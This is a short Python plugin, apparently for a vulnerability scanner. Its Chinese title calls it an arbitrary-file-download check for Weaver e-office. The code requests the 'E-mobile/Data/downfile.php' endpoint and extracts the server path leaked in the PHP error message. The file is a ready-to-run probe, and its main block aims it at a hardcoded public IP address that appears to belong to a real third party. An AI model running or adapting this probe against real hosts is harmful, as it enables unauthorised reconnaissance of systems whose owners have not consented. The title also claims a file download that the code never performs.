#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:   泛微e-office 任意文件下载(应该不重复)
#Refer:
import re
def assign(service,arg):
    if service=="weaver_oa":
        return True,arg 
    
def  audit(arg):
    url=arg+"E-mobile/Data/downfile.php?url=123"
    code,head,res,errcode,_=curl.curl2(url)
    if code == 200:
        m = re.search('No error in <b>([^<]+)</b>', res)
        if m:
            security_info(m.group(1))
            
if __name__=="__main__":
    from dummy import *
    
    audit(assign('weaver_oa','http://122.224.149.30:8082/')[1])